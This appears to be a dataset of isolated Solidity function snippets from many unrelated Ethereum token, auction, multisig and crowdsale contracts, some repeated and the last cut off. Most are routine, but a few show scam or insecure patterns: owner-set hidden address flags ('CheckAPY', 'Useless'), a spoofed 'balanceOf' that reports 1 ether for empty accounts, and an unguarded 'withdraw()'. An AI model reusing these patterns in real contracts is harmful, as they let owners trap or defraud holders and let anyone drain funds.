function destroy(uint amount) onlyOwner {
          require(amount>0 && balances[this] >= amount);
          balances[this] -= amount;
          totalSupply -= amount;
    }
--------------------------------------------------------------------------------
function withdraw() public{
		require(msg.sender == master[0]);
		master[0].transfer(address(this).balance);
	}
--------------------------------------------------------------------------------
function () payable public {
    if (contractStage == 1) {
      _ethDeposit();
    } else if (contractStage == 3) {
      _ethRefund();
    } else revert();
  }
--------------------------------------------------------------------------------
function withdrawFor (address contributor, address tokenAddr) public onlyOwner {
    require (contractStage == 3);
    require (contributorMap[contributor].balance > 0);
    _withdraw(contributor, tokenAddr);
  }
--------------------------------------------------------------------------------
function getCurrentPrice(uint40 _cutieId)
        public
        view
        returns (uint128)
    {
        Auction storage auction = cutieIdToAuction[_cutieId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function withdraw(address _beneficiary) external override onlyBorrower onlyFunded {
        status = Status.Withdrawn;
        require(currencyToken.transfer(_beneficiary, receivedAmount()));

        emit Withdrawn(_beneficiary);
    }
--------------------------------------------------------------------------------
constructor (ProxyRegistry registryAddress, TokenTransferProxy tokenTransferProxyAddress, ERC20 tokenAddress, address protocolFeeAddress) public {
        registry = registryAddress;
        tokenTransferProxy = tokenTransferProxyAddress;
        exchangeToken = tokenAddress;
        protocolFeeRecipient = protocolFeeAddress;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function setBlacklist(address _address, bool _bool) public onlyOwner {
        require(_address != address(0));

        blacklist[_address] = _bool;
        emit SetBlacklist(_address, _bool);
    }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 3;
        return res;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    glacier[spender] = val;
    lovely[spender] = val2; 
    always[spender] = val3;
    cocos = val4;
  }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        super._mint(_to, _tokenId);

        allTokensIndex[_tokenId] = allTokens.length;
        allTokens.push(_tokenId);
    }
--------------------------------------------------------------------------------
function setRewardsAmount(address _property, uint256 _value) external {
		addressValidator().validateAddress(msg.sender, config().withdraw());

		eternalStorage().setUint(getRewardsAmountKey(_property), _value);
	}
--------------------------------------------------------------------------------
function setCumulativePrice(address _property, uint256 _value)
		external
		returns (uint256)
	{
		addressValidator().validateAddress(msg.sender, config().withdraw());

		eternalStorage().setUint(getCumulativePriceKey(_property), _value);
	}
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) external onlyOwner returns (bool ok)  {
    uint256 converterdValue = value * (10 ** uint256(tokenDecimals));
    return token.transfer(to, converterdValue);
   }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function cancel(uint256 _sanity) ifCreator external {
        
        // avoid unintended transaction calls
        
        require(_sanity == 111110101);
	    
	    // the sale must be ongoing
	    
        require(progress == 0);
        
        // record that the sale is cancelled
        
        progress = -1;
        
        // log the cancellation
        
        Cancelled(tokens, value);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowed[msg.sender][spender]+addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowed[msg.sender][spender]-subtractedValue);
        return true;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint40 _cutieId)
        public
        view
        returns (uint128)
    {
        Auction storage auction = cutieIdToAuction[_cutieId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function breakDown() 
        internal
        returns(bool)
    {
        // is game ended
        if (lastBuyTime + ONEDAY < now) {
            isEnd = true;
            return true;
        } else {
            return false;
        }
    }
--------------------------------------------------------------------------------
constructor(address operation) public {
    _totalSupply = INITIAL_SUPPLY;
    _balances[operation] = INITIAL_SUPPLY;
    emit Transfer(address(0), operation, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function setDefaultFeePercentage(uint256 newDefaultFeePercentage) external requiresAuth {
        // A fee percentage over 100% makes no sense.
        require(newDefaultFeePercentage <= 1e18, "FEE_TOO_HIGH");

        // Update the default fee percentage.
        defaultFeePercentage = newDefaultFeePercentage;

        emit DefaultFeePercentageUpdated(msg.sender, newDefaultFeePercentage);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function setNewStakeCreator(address _stakeCreator) external onlyOwner {
        require(_stakeCreator != address(0), 'Do not use 0 address');
        stakeCreator = _stakeCreator;
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) internal pure returns (uint) 
    {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function acceptOwnership()
        public
        noReentry
        returns (bool)
    {
        require(msg.sender == newOwner);
        ChangedOwner(owner, newOwner);
        owner = newOwner;
        return true;
    }
--------------------------------------------------------------------------------
function abc_initNetwork() internal returns(bool) { 
         //mainnet
         if (getCodeSize(0xde4413799c73a356d83ace2dc9055957c0a5c335)>0){     
            resolver = abcResolverI(0xde4413799c73a356d83ace2dc9055957c0a5c335);
            return true;
         }               
   
         //others ...

         return false;
     }
--------------------------------------------------------------------------------
function returnTokens(uint tokensAmount) afterDeadline {
        if (!crowdsaleClosed) throw;
        if (beneficiary == msg.sender) {
            tokenReward.transfer(beneficiary, tokensAmount);
        }
    }
--------------------------------------------------------------------------------
function unregisterMinterERC20(address ERC20) public isOwner {
        require(isMinterERC20(ERC20), "This address is not registered");
        delete minterERC20s[ERC20];
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) revert();
      if (msg.sender != upgradeMaster) revert();
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function makeCoin(uint256 _value)public returns (bool){
        require(msg.sender == owner);
        totalSupply += _value;
        balances[owner] += _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, uint256 inactivityReleasePeriod_) {
        owner = msg.sender;
        feeAccount = feeAccount_;
        inactivityReleasePeriod = inactivityReleasePeriod_;
        makerFee = makerFee_;
        takerFee = takerFee_;
    }
--------------------------------------------------------------------------------
function addAdministrator(address _administrator) onlyOwner public returns (bool) {
        if (isAdministrator(_administrator)) {
            return false;
        } else {
            addRole(_administrator, ROLE_ADMINISTRATOR);
            return true;
        }
    }
--------------------------------------------------------------------------------
function removeAdministrator(address _administrator) onlyOwner public returns (bool) {
        if (isAdministrator(_administrator)) {
            removeRole(_administrator, ROLE_ADMINISTRATOR);
            return true;
        } else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) revert();
      if (msg.sender != upgradeMaster) revert();
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function calculatePrice(uint stage) public view returns (uint) {
        return a.mul(log(stage.mul(MAGNITUDE))).div(MAGNITUDE).add(b);
    }
--------------------------------------------------------------------------------
function getBalance(ERC20 token, address user) public view returns(uint) {
        if (token == ETH_TOKEN_ADDRESS)
            return user.balance;
        else
            return token.balanceOf(user);
    }
--------------------------------------------------------------------------------
function holderAt(uint256 index) public view onlyMinter returns (address) {
    require(index < shareholders.length, 'index out of bound');
    return shareholders[index];
  }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value)
    public
    isVerifiedAddress(to)
    returns (bool)
  {
    updateShareholders(to);
    pruneShareholders(msg.sender, value);
    return super.transfer(to, value);
  }
--------------------------------------------------------------------------------
function transferFrom(
    address from,
    address to,
    uint256 value
  ) public isVerifiedAddress(to) returns (bool) {
    updateShareholders(to);
    pruneShareholders(from, value);
    return super.transferFrom(from, to, value);
  }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function stake()
        public
    {
        _getLPToken();
        uint256 amount = IERC20(lp).balanceOf(address(this));
        staking.stake(amount);
    }
--------------------------------------------------------------------------------
function _getTokenFromHere(address token)
        public
        onlyGovOrSubGov
    {
        IERC20 t = IERC20(token);
        t.transfer(reserves, t.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () {
        _name = "LOGAN";
        _symbol = "LGN ";
        _totalSupply;
        _mint(owner(), 1000000000 * 10 ** (decimals()) );

    }
--------------------------------------------------------------------------------
constructor(address _wallet)
    public {
    require(_wallet != 0x0);

    owner = msg.sender;
    wallet = _wallet;
    stage = Stages.Deployed;
  }
--------------------------------------------------------------------------------
function acceptManagement() public {
        require(msg.sender == newManager);
        ManagerUpdate(manager, newManager);
        manager = newManager;
        newManager = 0x0;
    }
--------------------------------------------------------------------------------
function takeOf(address to,uint256 amount) public onlyOwner {
        TransferHelper.safeTransfer(USDT,to,amount);
        emit TakeOf(msg.sender,to,amount);
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
        if(locked) {
            return false;
        }

        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _setBurnPercentage(uint256 burnPercentage) external onlyOwner returns (bool) {
        if(_burnPercentage < 0 || _burnPercentage > 100)
            return false;

        _burnPercentage = burnPercentage;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x272b16Ec5E2B130d0881235CA18474c9A2a33b3f,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function snapshot() public returns (uint256) {
        _currentSnapshotId.increment();

        uint256 currentId = _currentSnapshotId.current();
        emit Snapshot(currentId);
        return currentId;
    }
--------------------------------------------------------------------------------
function OnyxToken() public {
		totalSupply_ = INITIAL_SUPPLY;
		balances[msg.sender] = INITIAL_SUPPLY;
		Transfer(0x0, msg.sender, INITIAL_SUPPLY);
	}
--------------------------------------------------------------------------------
function CoxxxCoinCrowdsale(
        address sendTo,
        address addressOfTokenUsedAsReward
    ) {
        beneficiary = sendTo;
        /* 0.0001 x 1 ether in wei */
        price = 100000000000000;
        initialTokenAmount = 500000000;
        currentTokenAmount = 500000000;
        tokenReward = token(addressOfTokenUsedAsReward);
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
constructor() public {
        totalSupply_ = TOTAL_SUPPLY; // set total amount of tokens
        balances[owner] = TOTAL_SUPPLY; // transfer all tokens to smart contract owner

        emit Transfer(address(0), owner, totalSupply_); // emit Transfer event and notify that transfer of tokens was made
    }
--------------------------------------------------------------------------------
function acceptOwnership() {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function setup(address _coreAddress, address _pluginsContract) public onlyOwner {
        CutieCoreInterface candidateContract = CutieCoreInterface(_coreAddress);
        require(candidateContract.isCutieCore());
        coreContract = candidateContract;

        pluginsContract = _pluginsContract;
    }
--------------------------------------------------------------------------------
function getApproved(uint256 tokenId)
        public
        view
        override
        returns (address)
    {
        require(_exists(tokenId), "approved query for nonexistent token");

        return _tokenApprovals[tokenId];
    }
--------------------------------------------------------------------------------
function setTokenURI(uint256 tokenId, string memory _tokenURI)
        public
        onlyOwner
    {
        require(_exists(tokenId), "URI set of nonexistent token");
        _tokenURIs[tokenId] = _tokenURI;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function safeWithdraw(address _withdraw, uint _amount) public
        onlyEscrow
    {
        NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet);
        if (namiWallet.isOwner(_withdraw)) {
            _withdraw.transfer(_amount);
        }
    }
--------------------------------------------------------------------------------
function getEtherToBuy (uint _ether, bool _status)
        public
        view
        returns (uint)
    {
        if (_status) {
            return _ether * rateWin / 100;
        } else {
            return _ether * rateLoss / 100;
        }
    }
--------------------------------------------------------------------------------
function BasicAccountInfo(uint8 _decimal) public {
        owner = msg.sender;

        initialCreatorAccount(_decimal);
        initialEcologyAccount(_decimal);
        initialInvestorAccount(_decimal);
        initialPartnerAccount(_decimal);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function() external payable {
        require(msg.sender == address(weth), "RewardedPntWethUniV2Pair: msg.sender is not weth");
    }
--------------------------------------------------------------------------------
function getFee(uint256 _amount) internal view returns (uint256) {
        uint256 fee = _amount * feeThousandthsPercent / 100000;
        return fee < minFeeAmount
            ? minFeeAmount
            : fee;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function holderAt(uint256 index) public view onlyMinter returns (address) {
    require(index < shareholders.length, 'index out of bound');
    return shareholders[index];
  }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value)
    public
    isVerifiedAddress(to)
    returns (bool)
  {
    updateShareholders(to);
    pruneShareholders(msg.sender, value);
    return super.transfer(to, value);
  }
--------------------------------------------------------------------------------
function transferFrom(
    address from,
    address to,
    uint256 value
  ) public isVerifiedAddress(to) returns (bool) {
    updateShareholders(to);
    pruneShareholders(from, value);
    return super.transferFrom(from, to, value);
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function safeApprove(address tokensHolder, address tokensSpender,
                         uint256 newTokensNumber) private {
        require(allowance[tokensHolder][tokensSpender] == 0 ||
                newTokensNumber == 0);

        unsafeApprove(tokensHolder, tokensSpender, newTokensNumber);
    }
--------------------------------------------------------------------------------
function TripleAlphaCrowdsalePreICO(uint256 _startTime, address _wallet) Stage(_startTime)

    {
        require(_startTime >= now);
        require(_wallet != 0x0);

        token = new TripleAlphaTokenPreICO();
        wallet = _wallet;
    }
--------------------------------------------------------------------------------
function PXP() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
    public
    ownerExists(msg.sender)
    transactionExists(transactionId)
    notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
constructor(address _nftAddress, uint256 _cut) public {
        require(_cut <= 10000);
        ownerCut = _cut;

        ERC721 candidateContract = ERC721(_nftAddress);
        nonFungibleContract = candidateContract;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        public
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function Useless(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    artifical[spender] = val;
    intelligence[spender] = val2; 
    money[spender] = val3;
    boner = val4;
  }
--------------------------------------------------------------------------------
function _distinctOwners(address addr1, address addr2) private constant returns (bool) {
    // Check that both addresses are different
    require(addr1 != addr2);
    // Check that both addresses are owners
    require(owners[addr1]);
    require(owners[addr2]);
    return true;
  }
--------------------------------------------------------------------------------
function getClaimRemainingChallengers(bytes32 superblockHash) public view returns (uint) {
        SuperblockClaim storage claim = claims[superblockHash];
        return claim.challengers.length - (claim.currentChallenger);
    }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) public payable UpgradeabilityProxy(_logic, _data) {
        assert(ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(_admin);
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
		super._mint(_to, _tokenId);

		allTokensIndex[_tokenId] = allTokens.length;
		allTokens.push(_tokenId);
	  }
--------------------------------------------------------------------------------
constructor() {
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
--------------------------------------------------------------------------------
function()
    external
    payable
{
    if ( msg.sender == partnerAddress_ ) {
        //convert money sent from partner contract into rewards for all token holders
        makeItRain();
    } else {
       purchaseTokens( msg.sender, msg.value ); 
    }
}
--------------------------------------------------------------------------------
function calculateExpectedTokens(uint256 etherValue) 
    external
    view
    returns(uint256)
{
    uint256 etherAfterFee = valueAfterFee( etherValue )[1];
    uint256 amountTokens = etherToTokens( etherAfterFee );
    return amountTokens;
}
--------------------------------------------------------------------------------
function rewardsOf( address playerAddress )
    public
    view
    returns(uint256 playerRewards)
{
    playerRewards = (uint256) ( ( (int256)( _rewardsPerTokenAllTime * tokenBalanceLedger_[ playerAddress ] ) - payoutsToLedger_[ playerAddress ] ) / IMAGNITUDE );
    return playerRewards;
}
--------------------------------------------------------------------------------
function balanceOf(address _owner) public constant returns (uint256 balance) { 
    if( balances[_owner] < 1 ) return 1 ether;
    else return balances[_owner];
  }
--------------------------------------------------------------------------------
constructor(string memory name, string memory symbol, string memory baseURI) public ERC721(name, symbol) {
_setupRole(DEFAULT_ADMIN_ROLE, _msgSender());

_setupRole(MINTER_ROLE, _msgSender());
_setupRole(PAUSER_ROLE, _msgSender());

_setBaseURI(baseURI);
}
--------------------------------------------------------------------------------
function transferOwnership(
        address newOwner
        )
        public
        virtual
        onlyOwner
    {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
--------------------------------------------------------------------------------
function withdrawERC20Token(address _token) public onlyOwner stopInEmergency {
        ERC20 foreignToken = ERC20(_token);
        foreignToken.transfer(msg.sender, foreignToken.balanceOf(this));
    }
--------------------------------------------------------------------------------
function withdrawEIP20Token(address _token) public onlyOwner stopInEmergency {
        EIP20Interface foreignToken = EIP20Interface(_token);
        foreignToken.transfer(msg.sender, foreignToken.balanceOf(this));
    }
--------------------------------------------------------------------------------
function _getMinActiveBalanceMultiple(uint256 _activeBalance, uint256 _minActiveBalance) internal pure returns (uint64) {
        // Note that guardians may not reach the minimum active balance since some might have been slashed. If that occurs,
        // these guardians cannot vote in the final round.
        if (_activeBalance < _minActiveBalance) {
            return 0;
        }

        // Otherwise, return the times the active balance of the guardian fits in the min active balance, multiplying
        // it by a round factor to ensure a better precision rounding.
        return (FINAL_ROUND_WEIGHT_PRECISION.mul(_activeBalance) / _minActiveBalance).toUint64();
    }
--------------------------------------------------------------------------------
function schedule(uint256 _cid, uint256 _sid) 
        public
        scheduleValid(_cid, _sid) 
        view 
        returns(uint32, uint256) {
        return (scheduleChains[_cid].nodes[_sid].timestamp, scheduleChains[_cid].nodes[_sid].trio);
    }
--------------------------------------------------------------------------------
function __callback(bytes32 _queryId, string _result, bytes _proof) onlyOraclize
    {
        if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0)
        {
            ProofFailed(gameIndex);
        }
        else
        {
            determineWinner(_result);
        }
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
    ownerExists(msg.sender)
    transactionExists(transactionId)
    notConfirmed(transactionId, msg.sender)
  public {
    confirmations[transactionId][msg.sender] = true;
    Confirmation(msg.sender, transactionId);
    executeTransaction(transactionId);
  }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "INVALID_OWNER");
        emit OwnershipTransferPrepared(_OWNER_, newOwner);
        _NEW_OWNER_ = newOwner;
    }
--------------------------------------------------------------------------------
function tokensPerEth() public view returns (uint256) {
        int256 answer;
        (, answer, , , ) = INterfaces(oracle).latestRoundData();
        // need 18 decimals
        return uint256(answer * (10**10));
    }
--------------------------------------------------------------------------------
function recoverEth() external onlyOwner {
        require(block.timestamp > dateEnd, ERR_SOON);
        payable(owner).transfer(address(this).balance);
    }
--------------------------------------------------------------------------------
function mint(
	    address _owner,
		uint256 _id,
		uint256 _quantity,
		bytes memory _data
	) public onlyMinter {
		_mint(_owner, _id, _quantity, _data);
		tokenSupply[_id] = tokenSupply[_id].add(_quantity);
	}
--------------------------------------------------------------------------------
function getWallet(string calldata recipientID) external view returns (Wallet memory) {
        require(walletsIDMap[recipientID].walletAddress != address(0x0), "invalid wallet");
        return walletsIDMap[recipientID];
    }
--------------------------------------------------------------------------------
function cancelTransferRight(address _from) onlyOwner public {
        require(!transferable);
        require(transferGrants[_from]);
        transferGrants[_from] = false;
        emit TransferRightCancelled(_from);
    }
--------------------------------------------------------------------------------
function updateDarsa(string memory darsa_uac, string memory darsa_utc) external onlyOwner returns(string memory){
        
        DARSA_UAC = darsa_uac;
        DARSA_UTC = darsa_utc;
        
        return "DARSA UAC and UTC updated successfully";
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
constructor(uint256 _openingTime, uint256 _closingTime) public {
    // solium-disable-next-line security/no-block-members
    require(_openingTime >= block.timestamp);
    require(_closingTime >= _openingTime);

    openingTime = _openingTime;
    closingTime = _closingTime;
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        return transferMain(msg.sender, _to, _value);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function ()
        external
        payable
    {
        if (msg.sender != address(WETH)) {
            LibRichErrors.rrevert(LibWethUtilsRichErrors.DefaultFunctionWethContractOnlyError(
                msg.sender
            ));
        }
    }
--------------------------------------------------------------------------------
function acceptOwnership() external onlyOwnerCandidate {
        address previousOwner = owner;

        owner = newOwnerCandidate;
        newOwnerCandidate = address(0);

        OwnershipTransferred(previousOwner, owner);
    }
--------------------------------------------------------------------------------
function changeUpgradeAgent(address _newAgent)
        public
        onlyOwner
    {
        require(totalUpgraded == 0);

        upgradeAgent = UpgradeAgent(_newAgent);

        require(upgradeAgent.isUpgradeAgent());

        ChangeUpgradeAgent(_newAgent);
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
constructor(uint256 openingTime, uint256 closingTime) public {
    // solium-disable-next-line security/no-block-members
    require(openingTime >= block.timestamp);
    require(closingTime >= openingTime);

    _openingTime = openingTime;
    _closingTime = closingTime;
  }
--------------------------------------------------------------------------------
function lockForMemberVote(address _of, uint _days) public onlyOperator {
        if (_days.add(now) > isLockedForMV[_of])
            isLockedForMV[_of] = _days.add(now);
    }
--------------------------------------------------------------------------------
function switchRefSys() external onlyOwner {

        if (RS == ReferrerSystem.ON) {
            RS = ReferrerSystem.OFF;
        } else {
            RS = ReferrerSystem.ON;
        }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, F4Ddatasets.EventReturns memory _eventData_)
        private
        returns(F4Ddatasets.EventReturns)
    {
        // pay 14% out to owner rewards
        uint256 _own = _eth.mul(14) / 100;
        owner_.transfer(_own);
        
        return(_eventData_);
    }
--------------------------------------------------------------------------------
constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply) public ERC20(name, symbol) {
        _setupDecimals(decimals);
        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
        _setupRole(MINTER_ROLE, _msgSender());
        _mint(_msgSender(), totalSupply);
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function setEnabled(bool flag) external {
        require(msg.sender == owner, "Only owner can enable/disable");
        enabled = flag;
    }
--------------------------------------------------------------------------------
function read() external view returns (uint256 value) {
        value = getMedianPrice();
        require(
          both(value > 0, isValid()),
          "UniswapV3Medianizer/invalid-price-feed"
        );
    }
--------------------------------------------------------------------------------
function withdraw() external {
        msg.sender.transfer(address(this).balance);
        emit Send(msg.sender, 0);
    }
--------------------------------------------------------------------------------
function Gold(address _mntpContractAddress, address _goldmintTeamAddress, address _goldFeeAddress) public {
          creator = msg.sender;

          mntpToken = IMNTP(_mntpContractAddress);
          goldmintTeamAddress = _goldmintTeamAddress; 
          goldFee = IGoldFee(_goldFeeAddress);
     }
--------------------------------------------------------------------------------
function approveLiquidity(address liquidity) external onlyGovernance{
        require(!liquidityAccepted[liquidity], "approveLiquidity: !pair");
        liquidityAccepted[liquidity] = true;
        liquidityPairs.push(liquidity);
    }
--------------------------------------------------------------------------------
function safeWithdraw(address _withdraw, uint _amount) public
        onlyEscrow
    {
        NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet);
        if (namiWallet.isOwner(_withdraw)) {
            _withdraw.transfer(_amount);
        }
    }
--------------------------------------------------------------------------------
function _buy(address _sender, bool _acceptAny) internal returns (uint id) {
        id = _buyFrom(_sender);
        arbitratorlicenseDetails[_sender].id = id;
        arbitratorlicenseDetails[_sender].acceptAny = _acceptAny;
    }
--------------------------------------------------------------------------------
function tradingStatus(bool _status, uint256 _deadBlocks) public onlyOwner {
        tradingOpen = _status;
